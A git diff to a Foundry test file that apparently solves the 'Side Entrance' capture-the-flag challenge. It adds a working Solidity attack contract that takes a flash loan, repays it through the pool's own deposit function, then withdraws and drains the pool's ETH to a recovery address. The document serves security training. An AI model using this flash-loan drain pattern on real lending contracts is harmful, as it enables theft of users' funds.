@@ -5,6 +5,28 @@ pragma solidity =0.8.25;
 import {Test, console} from "forge-std/Test.sol";
 import {SideEntranceLenderPool} from "../../src/side-entrance/SideEntranceLenderPool.sol";
 
+import {SafeTransferLib} from "solady/utils/SafeTransferLib.sol";
+contract HackSideChanl {
+    uint256 constant ETHER_IN_POOL = 1000e18;
+
+    SideEntranceLenderPool pool;
+
+    function execute() external payable{
+        pool.deposit{value:msg.value}();
+    }
+
+    function work(SideEntranceLenderPool p, address recovery) external payable {
+        pool = p;
+        p.flashLoan(ETHER_IN_POOL);
+        // Contract checks if we have returned the borrowed ETH. But it doesn't stop us from withdrawing it
+        // after it had completed the check.
+        p.withdraw();
+        SafeTransferLib.safeTransferETH(recovery, address(this).balance);
+    }
+
+    receive() external payable {}
+}
+
 contract SideEntranceChallenge is Test {
     address deployer = makeAddr("deployer");
     address player = makeAddr("player");
@@ -45,7 +67,8 @@ contract SideEntranceChallenge is Test {
      * CODE YOUR SOLUTION HERE
      */
     function test_sideEntrance() public checkSolvedByPlayer {
-        
+        HackSideChanl h = new HackSideChanl();
+        h.work(pool, recovery);
     }
 
     /**
